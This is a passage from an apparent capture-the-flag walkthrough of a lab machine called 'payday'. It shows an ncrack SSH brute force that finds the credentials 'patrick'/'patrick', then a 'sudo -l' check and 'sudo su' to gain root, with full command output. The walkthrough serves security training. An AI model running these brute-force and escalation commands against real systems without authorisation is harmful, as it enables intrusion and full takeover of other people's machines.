ACCOUNT FOUND: [ssh] Host: 192.168.120.85 User: patrick Password: patrick [SUCCESS]
kali@kali:~$
SSH Password Bruteforce Using Ncrack
kali@kali:~$ ncrack 192.168.120.85 -U users.txt -P users.txt -p ssh -f -v

Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-03-25 09:03 EDT

Discovered credentials on ssh://192.168.120.85:22 'patrick' 'patrick'
ssh://192.168.120.85:22 finished.

Discovered credentials for ssh on 192.168.120.85 22/tcp:
192.168.120.85 22/tcp ssh: 'patrick' 'patrick'

Ncrack done: 1 service scanned in 3.01 seconds.
Probes sent: 1 | timed-out: 0 | prematurely-closed: 0

Ncrack finished.
kali@kali:~$
Escalation
Local Enumeration
patrick@payday:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL
Sudo
As the patrick user is permitted to run all commands, we can simply use “sudo su” to escalate to root.

patrick@payday:~$ sudo su
root@payday:/home/patrick# id
uid=0(root) gid=0(root) groups=0(root)
```
